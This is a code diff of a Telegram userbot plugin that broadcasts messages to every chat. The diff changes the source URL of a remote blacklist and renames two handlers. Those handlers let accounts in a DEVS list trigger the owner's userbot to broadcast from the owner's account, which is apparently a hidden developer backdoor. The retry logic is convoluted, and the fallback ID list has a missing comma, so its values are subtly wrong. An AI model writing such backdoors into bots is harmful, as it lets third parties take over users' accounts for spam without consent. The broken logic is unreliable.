@@ -26,19 +26,19 @@ from .help import add_command_help
 
 while 0 < 6:
     _GCAST_BLACKLIST = get(
-        "https://raw.githubusercontent.com/iamuput/eizy/UputtNande/blacklistgcast.json"
+        "https://raw.githubusercontent.com/fsbub/rizki/UputtNande/blacklistgcast.json"
     )
     if _GCAST_BLACKLIST.status_code != 200:
         if 0 != 5:
             continue
-        GCAST_BLACKLIST = [-1001608701614, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001001951726069]
+        GCAST_BLACKLIST = [-1001608701614, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001951726069, -1001944702855]
     GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
     break
 
 del _GCAST_BLACKLIST
 
 
-@Client.on_message(filters.command("numpanggcast", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(filters.command("gcast", cmd) & filters.me)
 async def gcast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
@@ -70,7 +70,7 @@ async def gcast_cmd(client: Client, message: Message):
     )
 
 
-@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("cgucast", ["."]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(filters.command("gucast", cmd) & filters.me)
 async def gucast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
